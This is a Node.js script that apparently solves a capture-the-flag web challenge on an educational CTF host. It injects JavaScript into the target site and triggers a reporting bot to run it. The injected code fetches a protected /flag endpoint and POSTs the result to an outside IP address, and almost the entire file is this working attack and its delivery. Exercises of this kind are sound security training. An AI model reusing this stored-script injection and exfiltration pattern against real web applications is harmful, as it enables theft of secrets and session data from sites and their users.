const fetch = require('node-fetch');
const urlencode = require('urlencode');

async function main() {
    // Assuming you have some method of authentication (not shown in the provided code)
    const cookies = 'authenticated=true'; // Placeholder, replace with your method

    // URL encode the API URL and JavaScript code
    const url = urlencode('http://140.112.29.204:4000');
    const javascript = urlencode(
                `fetch("/flag", { headers: {"give-me-the-flag": "yes"} })
                 .then(resp => resp.text())
                 .then(flag => {
                     return fetch("http://140.112.29.204:4000/submit_flag", {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({ flag })
                     });
                 })
                 .then(resp => resp.text())
                 .then(responseText => {
                     console.log("API server says:", responseText);
                 });`);

    // Add the API
    let response = await fetch('http://edu-ctf.zoolab.org:10010/add-api', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookies
        },
        body: `url=${url}&javascript=${javascript}`
    });

    if (response.status !== 200) {
        console.error(`Failed to add API. Status: ${response.status}. Body:`, await response.text());
        return;
    }

    const text = await response.text();
    const match = text.match(/API ID is ([a-f0-9-]+)/);
    if (!match) {
        console.error("Unexpected response:", text);
        return;
    }
    const id = match[1];
    console.log("API ID successfully obtained:", id); // Printing the obtained ID

    // Report a specific alias (assuming one from our API)
    const alias = 'qwe'; // Replace with one from your API

    let response_flag = await fetch('http://edu-ctf.zoolab.org:10010/report', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookies
        },
        body: `id=${id}&alias=${alias}`
    });

    const flagText = await response_flag.text();
    console.log("Flag response:", flagText);
}

main();
